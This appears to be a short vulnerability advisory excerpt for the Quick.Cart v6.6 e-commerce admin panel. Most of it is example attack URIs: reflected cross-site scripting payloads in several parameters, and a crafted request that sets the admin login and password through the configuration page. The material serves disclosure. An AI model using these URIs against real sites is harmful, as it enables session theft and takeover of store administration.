Attackers can exploit these issues by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:


http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?p=orders-list&amp;iStatus=";&gt;&lt;script&gt;alert(1)&lt;/script&gt;

http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?p=orders-list&amp;iProducts=";&gt;&lt;script&gt;alert('xss')&lt;/script&gt;

http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?p=lang-translations&amp;sLanguage=&lt;script&gt;alert(1)&lt;/script&gt;

http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?_COOKIEsLogin="; autofocus onfocus="alert('xss')

http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?_SERVERHTTP_HOST=";&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;_SERVERSCRIPT_FILENAME=/var/www/ecommerce/Quick.Cart_v6.6/admin.php

http://www.example.com/ecommerce/Quick.Cart_v6.6/admin.php?p=tools-config&amp;_POSTsOption=save%20%26raquo%3B&amp;_POSTlogin=admin&amp;_POSTpass=123&amp;_POSTsubmit=Submit%20request
